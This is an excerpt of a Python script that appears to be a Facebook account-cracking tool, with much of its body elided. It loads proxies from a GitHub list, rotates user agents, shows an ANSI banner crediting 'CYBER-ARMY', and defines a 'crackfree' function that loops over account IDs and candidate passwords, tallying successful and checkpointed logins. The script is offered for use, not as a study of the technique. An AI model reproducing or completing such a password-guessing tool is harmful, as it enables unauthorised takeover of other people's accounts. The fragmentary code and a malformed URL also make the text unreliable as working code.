...
princp=[]
try:
    prox= requests.get('https://github.com/MAHMUD-IBRAHIM -404/PRO-MAX/blob/main/Prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/MAHMUD-IBRAHIM -404/PRO-MAX/blob/main/Prox.txt').text
        ua=open('bbnew.txt','w')
...
os.system("xdg-open https://https://www.facebook.com/Cyber.Army00")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
\033[1;93m╔═════════════════[\033[1;32m ADMIN - INFO \033[1;32m]═════════════╗
 \033[1;93m║\033[1;96m[✓] develop BY\33[0;m   : \033[1;96m CYBER-ARMY            \033[1;32m║
 \033[1;93m║\x1b[38;5;208m[✓] \x1b[38;5;208mFACEBOK      : \x1b[38;5;208m IBRAHIM VAU               \033[1;32m║
 ...
 \033[1;93m║[\033[1;97m•\033[1;91m]\033[1;32m REQUEST MY FB ID IBRAHIM VAU....         \033[1;32m ║
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[IBRAHIM -M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
